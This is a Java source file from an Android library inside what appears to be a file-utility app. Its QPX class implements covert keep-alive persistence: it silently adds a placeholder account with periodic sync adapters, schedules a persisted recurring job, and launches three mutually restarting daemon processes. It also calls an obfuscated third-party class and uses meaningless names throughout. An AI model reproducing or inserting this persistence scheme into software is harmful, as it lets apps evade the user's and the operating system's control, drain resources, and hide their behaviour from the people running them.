package com.hal.convenientfile.lib.tools;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.PeriodicSync;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;

import com.hal.convenientfile.lib.component.Midd;
import com.hal.convenientfile.lib.component.QPI;
import com.yBHgpqSw.LqRhYWdWy.GcYPMM;

import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * @author Create by Payne on 2021/5/26
 * Description:
 **/
public class QPX {
    public static Account account;
    public static String authority1;
    public static String authority2;
    public static QPU assist;

    public static void init(Context context) {
        QPO appCxt = new QPO(context);
        getProcessAssist(appCxt);
        initAccount(appCxt);
    }

    private static void getProcessAssist(QPO appCxt) {
        GcYPMM.FdVJhzhjQIyp(appCxt.context);
        initAsukaJob(appCxt);
        initProcess(appCxt);
    }

    private static void initAccount(QPO bVar) {
        if (TextUtils.equals(bVar.pkgName, bVar.processName)) {
            try {
                authority1 = "account_provider";
                authority2 = "account_provider1";
                account = new Account("account_name", "account_type");
                AccountManager accountManager = AccountManager.get(bVar.context);
                int i2 = 0;
                if (accountManager.getAccountsByType("account_type").length <= 0) {
                    accountManager.addAccountExplicitly(account, null, Bundle.EMPTY);
                    ContentResolver.setIsSyncable(account, authority1, 1);
                    ContentResolver.setSyncAutomatically(account, authority1, true);
                    ContentResolver.setMasterSyncAutomatically(true);
                }
                setIsSyncable();
                if (!ContentResolver.isSyncPending(account, authority1)) {
                    initBundle(true);
                }
                List<PeriodicSync> periodicSyncs = ContentResolver.getPeriodicSyncs(account, authority1);
                if (periodicSyncs != null) {
                    if (periodicSyncs.size() > 0) {
                        i2 = 1;
                    }
                }
                if (i2 == 0) {
                    ContentResolver.addPeriodicSync(account, authority1, Bundle.EMPTY, Build.VERSION.SDK_INT >= 24 ? 900 : 3600);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void initAsukaJob(QPO bVar) {
        if (!TextUtils.equals(bVar.pkgName, bVar.processName) || Build.VERSION.SDK_INT < 21) {
            return;
        }
        if (bVar.c()) {
            LaunchSasukeTasks(bVar.context, 900);
        } else {
            cancelAsukaJob(bVar.context);
        }
    }

    private static void initProcess(QPO appCxt) {
        if (assist == null) {
            initializeAssist(appCxt);
        }

        if (assist != null) {
            processBasedOnName(appCxt);
        }
    }

    private static void initializeAssist(QPO appCxt) {
        try {
            QPU.Builder builder = createAssistBuilder(appCxt);
            assist = builder.build();
        } catch (Exception e) {
            assist = null;
        }
    }

    private static QPU.Builder createAssistBuilder(QPO appCxt) {
        QPU.Builder builder = new QPU.Builder(appCxt.context);
        builder.pkgName = appCxt.pkgName;
        builder.processOne = builder.pkgName + ":" + "shinji";
        builder.processTwo = builder.pkgName + ":" + "rei";
        builder.processThree = builder.pkgName + ":" + "asuka";
        builder.instruIntent = new Intent().setClassName(appCxt.pkgName, QPI.QPR.class.getName());
        builder.dServiceIntent = new Intent().setClassName(appCxt.pkgName, QPI.QQF.class.getName());
        builder.dReceiverIntent = new Intent().setClassName(appCxt.pkgName, QPI.QPZ.class.getName()).setPackage(appCxt.pkgName);
        builder.serviceStarter = new QQK();
        return builder;
    }

    private static void processBasedOnName(QPO appCxt) {
        if (assist.pkgName.equals(appCxt.processName)) {
            QPI.QQL.register(appCxt.context);
            QPI.QPY.send(appCxt.context);
            startServices(appCxt);
        }

        startDaemonIfNeeded(appCxt);
    }

    private static void startServices(QPO appCxt) {
        assist.serviceStarter.start(appCxt.context, assist.processOne);
        assist.serviceStarter.start(appCxt.context, assist.processTwo);
        assist.serviceStarter.start(appCxt.context, assist.processThree);
    }

    private static void startDaemonIfNeeded(QPO appCxt) {
        if (assist.processOne.equals(appCxt.processName)) {
            QPV.startDaemon("shinji", "rei", "asuka");
        } else if (assist.processTwo.equals(appCxt.processName)) {
            QPV.startDaemon("rei", "shinji", "asuka");
        } else if (assist.processThree.equals(appCxt.processName)) {
            QPV.startDaemon("asuka", "shinji", "rei");
        }
    }



    @TargetApi(21)
    private static void LaunchSasukeTasks(Context context, int intervalTime) {
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        JobInfo.Builder builder = new JobInfo.Builder(10086, new ComponentName(context.getPackageName(), Midd.QQI.class.getName()));
        builder.setPersisted(true);
        builder.setPeriodic(TimeUnit.SECONDS.toMillis((long) intervalTime));
        jobScheduler.cancel(1000);
        try {
            jobScheduler.schedule(builder.build());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @TargetApi(21)
    private static void cancelAsukaJob(Context context) {
        ((JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE)).cancel(1000);
    }

    public static QPU getProcessAssist() {
        return assist;
    }

    public static void setIsSyncable() {
        ContentResolver.setIsSyncable(account, authority2, -1);
    }

    public static void initBundle(boolean z) {
        try {
            Bundle bundle = new Bundle();
            bundle.putBoolean("force", true);
            if (z) {
                bundle.putBoolean("require_charging", true);
            }
            ContentResolver.requestSync(account, authority1, bundle);
        } catch (Exception e2) {
        }
    }

    public static boolean isDaemon(String processName){
        return processName.contains("asukaChannel")
                || processName.contains("asukaService")
                || processName.contains("asukaWorker")
                || processName.contains("daemon")
                || processName.contains("service");
    }
}
